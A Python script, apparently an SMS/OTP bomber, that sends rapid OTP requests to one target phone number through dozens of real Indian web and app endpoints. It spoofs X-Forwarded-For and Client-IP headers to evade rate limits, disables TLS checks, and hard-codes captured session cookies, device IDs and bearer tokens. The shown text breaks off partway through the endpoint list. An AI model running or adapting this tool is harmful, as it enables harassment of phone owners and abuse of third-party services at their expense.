import asyncio
import json,aiohttp
import sys
import urllib.parse
import uuid
import time
import os
from flask import Flask, request, jsonify

async def send_request(session, api, phone_number, ip_address, silent=False):
    try:
        # Handle dynamic endpoint (if it's a callable)
        endpoint = api["endpoint"](phone_number) if callable(api["endpoint"]) else api["endpoint"]
        
        # Handle dynamic headers
        headers = api["headers"].copy()
        for key, value in headers.items():
            if callable(value):
                if key == "Content-Length":
                    data = api["payload"](phone_number) if callable(api.get("payload")) else api.get("payload")
                    headers[key] = str(len(str(data).encode('utf-8')))
                elif key == "Timestamp":
                    headers[key] = str(int(time.time() * 1000))
                else:
                    headers[key] = value(phone_number) if value else ""
        
        # Ultra-fast timeout: 2 seconds total, 0.5s connect, 1.5s read
        timeout = aiohttp.ClientTimeout(total=2, connect=0.5, sock_read=1.5)
        
        if api["method"] == "POST":
            # Handle dynamic payload
            if callable(api.get("payload")):
                payload_data = api["payload"](phone_number)
                if isinstance(payload_data, str):
                    # If payload is a string, check if it's JSON or form data
                    if payload_data.strip().startswith('{'):
                        # It's JSON string, parse it
                        try:
                            payload_data = json.loads(payload_data)
                            response = await session.post(endpoint, json=payload_data, headers=headers, timeout=timeout, ssl=False)
                        except:
                            response = await session.post(endpoint, data=payload_data, headers=headers, timeout=timeout, ssl=False)
                    else:
                        # Form data string
                        response = await session.post(endpoint, data=payload_data, headers=headers, timeout=timeout, ssl=False)
                else:
                    # If payload is dict, send as JSON
                    response = await session.post(endpoint, json=payload_data, headers=headers, timeout=timeout, ssl=False)
            elif api.get("payload") is None:
                response = await session.post(endpoint, headers=headers, timeout=timeout, ssl=False)
            elif headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in api["payload"].items())
                headers["Content-Length"] = str(len(payload_str.encode('utf-8')))
                response = await session.post(endpoint, data=payload_str, headers=headers, timeout=timeout, ssl=False)
            else:
                response = await session.post(endpoint, json=api["payload"], headers=headers, timeout=timeout, ssl=False)
        elif api["method"] == "GET":
            response = await session.get(endpoint, headers=headers, timeout=timeout, ssl=False)
        else:
            if not silent:
                print(f"[!] Unsupported method for {endpoint}")
            return None, api
        
        status_code = response.status
        endpoint_str = endpoint if isinstance(endpoint, str) else (api["endpoint"](phone_number) if callable(api["endpoint"]) else str(api["endpoint"]))
        api_name = endpoint_str.split("//")[1].split("/")[0] if "//" in endpoint_str else endpoint_str
        
        if not silent:
            if status_code in [200, 201, 202]:
                print(f"[✓] OTP Sent via {api_name} | Status: {status_code}")
            elif status_code == 429:
                print(f"[!] Rate Limited: {api_name} | Status: {status_code}")
            elif status_code == 400:
                print(f"[✗] Bad Request: {api_name} | Status: {status_code}")
            elif status_code == 401:
                print(f"[✗] Unauthorized: {api_name} | Status: {status_code}")
            elif status_code == 403:
                print(f"[✗] Forbidden: {api_name} | Status: {status_code}")
            elif status_code == 404:
                print(f"[✗] Not Found: {api_name} | Status: {status_code}")
            else:
                print(f"[?] {api_name} | Status: {status_code}")
        
        return status_code, api
    except asyncio.TimeoutError:
        endpoint_str = api["endpoint"](phone_number) if callable(api["endpoint"]) else api["endpoint"]
        api_name = endpoint_str.split("//")[1].split("/")[0] if "//" in endpoint_str else endpoint_str
        if not silent:
            print(f"[!] Timeout: {api_name}")
        return None, api
    except aiohttp.ClientError as e:
        endpoint_str = api["endpoint"](phone_number) if callable(api["endpoint"]) else api["endpoint"]
        api_name = endpoint_str.split("//")[1].split("/")[0] if "//" in endpoint_str else endpoint_str
        if not silent:
            print(f"[✗] Error: {api_name} - {str(e)[:50]}")
        return None, api
    except Exception as e:
        endpoint_str = api["endpoint"](phone_number) if callable(api["endpoint"]) else api["endpoint"]
        api_name = endpoint_str.split("//")[1].split("/")[0] if "//" in endpoint_str else endpoint_str
        if not silent:
            print(f"[✗] Unknown Error: {api_name} - {str(e)[:50]}")
        return None, api

def get_apis_list(phone_number, ip_address):
    return [
        {
            "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "payload": {
                "mobileNo": phone_number,
                "countryCode": "+91",
                "appCode": "un",
                "messageId": "1",
                "emailId": "",
                "subject": "Register",
                "priority": "1",
                "device": "web",
                "variant": "v1",
                "templateCode": 1
            },
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "identifier": "home",
                "mlang": "en",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "alang": "en",
                "country_code": "IN",
                "vlang": "en",
                "origin": "https://www.hungama.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.hungama.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "payload": {"mobile_number": phone_number},
            "headers": {
                "Mobilenumber": phone_number,
                "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
                "Oauthtoken": "",
                "AppVersion": "245",
                "ApiVersion": "6.2.55",
                "DeviceType": "Android",
                "DeviceId": "44098bdebb2dc047",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "merucabapp.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.0",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "payload": {"api": "send_otp", "brand": "dayco", "mob": phone_number, "resend_otp": "resend_otp"},
            "headers": {
                "Host": "ekyc.daycoindia.com",
                "sec-ch-ua-platform": "\"Android\"",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "Origin": "https://ekyc.daycoindia.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
                "Priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "payload": {
                "app_version": "7.10.51",
                "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
                "course": "",
                "phone_number": phone_number,
                "language": "en",
                "udid": "b751fb63c0ae17ba",
                "class": "",
                "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
            },
            "headers": {
                "version_code": "1160",
                "has_upi": "false",
                "device_model": "ASUS_I005DA",
                "android_sdk_version": "28",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "payload": {"phone": phone_number, "countryCode": "IN"},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
                "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
                "origin": "https://www.nobroker.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.nobroker.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address,
                "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaFp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
            }
        },
        {
            "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "payload": {"mobileNumber": phone_number},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "Android",
                "authorization": "Bearer null",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://app.shiprocket.in",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.shiprocket.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
            "method": "POST",
            "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": phone_number},
            "headers": {
                "Host": "api.penpencil.co",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
            "method": "POST",
            "payload": {"phone_number": {"number": phone_number, "country_code": "+91"}},
            "headers": {
                "Host": "api.kpnfresh.com",
                "sec-ch-ua-platform": "\"Android\"",
                "cache": "no-store",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "x-channel-id": "WEB",
                "sec-ch-ua-mobile": "?1",
                "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
                "accept": "*/*",
                "origin": "https://www.kpnfresh.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.kpnfresh.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "payload": {"mobile_number": phone_number},
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
                "Host": "api.servetel.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.district.in/gw/auth/generate_otp",
            "method": "POST",
            "payload": {"phone_number": phone_number, "country_code": "91"},
            "headers": {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "cookie": "AKA_A2=A; x-device-id=8c86731e-b245-4365-9e5f-715addab5bcd",
                "origin": "https://www.district.in",
                "priority": "u=1, i",
                "referer": "https://www.district.in/movies/",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "x-app-type": "ed_web",
                "x-app-version": "11.11.1",
                "x-device-id": "8c86731e-b245-4365-9e5f-715addab5bcd",
                "x-guest-token": "1212",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://userservice.goibibo.com/ext/web/desktop/send/token/OTP_IS_REG",
            "method": "POST",
            "payload": {
                "loginId": phone_number,
                "countryCode": 91,
                "channel": ["mobile"],
                "type": 6,
                "appHashKey": ""
            },
            "headers": {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "authorization": "jkO7Ivpwsh4KaQ9",
                "content-type": "application/json",
                "currency": "inr",
                "host": "userservice.goibibo.com",
                "language": "eng",
                "origin": "https://www.goibibo.com",
                "referer": "https://www.goibibo.com/",
                "region": "in",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "user-identifier": '{"type":"auth","deviceId":"96f868a8-d65d-4ea1-a28d-0cad561f8cee","os":"desktop","osVersion":"osVersion","appVersion":"appVersion","imie":"imie","ipAddress":"ipAddress","timeZone":"+5.30 GMT","value":"","deviceOrBrowserInfo":"Chrome"}',
                "x-request-tracker": "201102b1-5d2e-44d4-a446-cd0387d6973d",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.fabhotels.com//consumer/v1/mweb/user/web/login",
            "method": "POST",
            "payload": {
                "mobile": phone_number,
                "userSource": "MWEB",
                "userType": "ONLINE",
                "countryCode": "91",
                "isoCode": "IN",
                "cleverTapId": "626c1565d92b4af4a0a76dddaa324c34",
                "firstName": "",
                "lastName": "",
                "password": "",
                "payload": "",
                "referralCode": None,
                "signature": ""
            },
            "headers": {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "cookie": "dab=3; visitorid=CgACA2lS2G04FTtpC/JkAg==; PHPSESSID=9mfq3bec50clavl9tu0k4iggeu",
                "origin": "https://www.fabhotels.com",
                "priority": "u=1, i",
                "referer": "https://www.fabhotels.com/",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.cleartrip.com/accounts/external-api/otp",
            "method": "POST",
            "payload": {
                "type": "MOBILE",
                "value": phone_number,
                "countryCode": "+91",
                "action": "SIGNIN"
            },
            "headers": {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "ab-otp": "b",
                "app-agent": "DESKTOP",
                "baggage": "sentry-environment=production,sentry-public_key=38a8785b30295eec5bb15535a6fc01f8,sentry-trace_id=bf321542ee634ff0ae04ecc480606851,sentry-org_id=4510040130650112,sentry-transaction=%2F,sentry-sampled=false,sentry-sample_rand=0.7943094735393529,sentry-sample_rate=0.1",
                "caller": "https://www.cleartrip.com",
                "channel": "desktop",
                "content-type": "application/json",
                "cookie": "rbzid=2nUwutW2iM+3fY1GHWDPjDAayQh9iPznW+8xiF5OCohShssgRP6rLq3sBnFDWd2SBHZCr4PotyKX4sQYAXKW2cJ1KtGgsSqbUSY/Tn96fSZq7oZI1N8zCI3tZFvDfQ5TuIl3n5TLip5T7yBWMxkgyttjZ8a30JH7LQ6SnlENFzrof9XH0XIZ92V7RBEq580IqTXAcJWWlFifd0DeOb4YUbQd3HOlNEDMKmRakS3qVog=; rbzsessionid=e11d75c7653aeb53c306b2476ba8feca",
                "origin": "https://www.cleartrip.com",
                "priority": "u=1, i",
                "referer": "https://www.cleartrip.com/",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sentry-trace": "bf321542ee634ff0ae04ecc480606851-b698163a55059db2-0",
                "traceparent": "00-5d80089debcfc04b6e0ef97552524caf-f63c73d39c12f25c-01",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "x-client-id": "cleartrip",
                "x-source-type": "Desktop",
                "x-unified-header": '{"platform":"desktop","trackingId":"fffc145b-bd7f-47c2-9844-147413df0549","source":"CLEARTRIP","deviceModel":"nexus 5"}',
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://secure.yatra.com/social/common/yatra/sendMobileOTP",
            "method": "POST",
            "payload": {
                "isdCode": "91",
                "mobileNumber": phone_number
            },
            "headers": {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "JSESSIONID=2B0ED71E1C6B2D626B3D65930E002F14; reactHome=true; smeLoginForm=true; newHotelUI100=true; deviceType=DESKTOP",
                "origin": "https://secure.yatra.com",
                "priority": "u=1, i",
                "referer": "https://secure.yatra.com/social/common/yatra/signin.htm",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "x-requested-with": "XMLHttpRequest",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://secure.yatra.com/social/common/yatra/mobileStatus",
            "method": "POST",
            "payload": {
                "isdCode": "91",
                "mobileNumber": phone_number
            },
            "headers": {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "JSESSIONID=2B0ED71E1C6B2D626B3D65930E002F14; reactHome=true; smeLoginForm=true; newHotelUI100=true; deviceType=DESKTOP",
                "origin": "https://secure.yatra.com",
                "priority": "u=1, i",
                "referer": "https://secure.yatra.com/social/common/yatra/signin.htm",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "x-requested-with": "XMLHttpRequest",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://b2cutilsapi.akbartravels.com/Utils/LoginOtp",
            "method": "POST",
            "payload": {
                "TUI": f"{uuid.uuid4()}|{uuid.uuid4()}|{time.strftime('%Y%m%d%H%M%S')}",
                "ClientID": phone_number,
                "CountryCode": "+91",
                "Type": "M"
            },
            "headers": {
                "accept": "application/json, text/plain, */*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjMzMyIsIm5iZiI6MTc2NzA5MzI3MywiZXhwIjoxNzY3MTc5NjczLCJpYXQiOjE3NjcwOTMyNzMsImlzcyI6IndlYmNvbm5lY3QiLCJhdWQiOiJjbGllbnQifQ.5d_FhnK2bbfyU1RQ3SG3xoEX55ABCjinKImOE_FGBP4",
                "content-type": "application/json",
                "origin": "https://www.akbartravels.com",
                "priority": "u=1, i",
                "referer": "https://www.akbartravels.com/",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "payload": lambda phone: json.dumps({"captcha": None, "phoneCode": "+91", "telephone": phone}),
            "headers": {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "X-API-Client": "mobilesite",
                "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
                "X-Accept-Language": "en",
                "X-B3-TraceId": "991736185845136",
                "X-Country-Code": "IN",
                "X-Country-Code-Override": "IN",
                "Sec-CH-UA-Platform": "\"Android\"",
                "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                "Sec-CH-UA-Mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "Origin": "https://www.lenskart.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.lenskart.com/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
            "method": "POST",
            "payload": lambda phone: f"check_mobile_number=1&contact={phone}",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "*/*",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.gopinkcabs.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Sec-CH-UA-Platform": "\"Android\"",
                "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                "Sec-CH-UA-Mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "Cookie": "PHPSESSID=mor5basshemi72pl6d0bp21kso; mylocation=#",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.shemaroome.com/users/resend_otp",
            "method": "POST",
            "payload": lambda phone: f"mobile_no=%2B91{phone}",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "*/*",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.shemaroome.com",
                "Referer": "https://www.shemaroome.com/users/sign_in",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
            "method": "POST",
            "payload": lambda phone: json.dumps({"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": phone}}),
            "headers": {
                "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
                "x-app-version": "3.2.6",
                "x-user-journey-id": "faf3393a-018e-4fb9-8aed-8c9a90300b88",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.11",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.bikefixup.com/api/v2/send-registration-otp",
            "method": "POST",
            "payload": lambda phone: json.dumps({"phone": phone, "app_signature": "4pFtQJwcz6y"}),
            "headers": {
                "accept": "application/json",
                "accept-encoding": "gzip",
                "host": "api.bikefixup.com",
                "client": "app",
                "content-type": "application/json; charset=UTF-8",
                "user-agent": "Dart/3.6 (dart:io)",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
            "method": "POST",
